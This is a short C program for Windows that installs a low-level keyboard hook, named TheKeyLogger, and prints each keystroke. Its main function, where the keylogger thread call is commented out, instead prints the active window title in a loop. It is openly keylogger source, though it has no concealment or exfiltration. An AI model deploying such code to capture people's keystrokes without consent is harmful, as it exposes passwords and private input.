#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    BOOL fEatKeystroke = FALSE;

    if (nCode == HC_ACTION)
    {
        switch (wParam)
        {
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
        case WM_KEYUP:
        case WM_SYSKEYUP:
        {
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            printf("%c", (char)p->vkCode);
            break;
        }
        }
    }
    return (fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}

void MessageLoop()
{
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

DWORD WINAPI TheKeyLogger()
{
    HINSTANCE hinstExe = GetModuleHandle(NULL);
    HHOOK hhLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinstExe, 0);

    MessageLoop();
    UnhookWindowsHookEx(hhLowLevelKybd);
    return 0;
}
int main()
{

    // HANDLE hThread;
    // DWORD dwThread;

    // hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)TheKeyLogger, (LPVOID)argv[0], NULL, &dwThread);
    // if (hThread)
    //     return WaitForSingleObject(hThread, INFINITE);
    // else
    //     return 1;

    char title[256];
    HWND handle;
    while (1)
    {
        handle = GetForegroundWindow();
        GetWindowTextA(handle, title, 256);
        printf("%s\n", title);
        Sleep(100); // roda 10 vezes por segundo
    }
}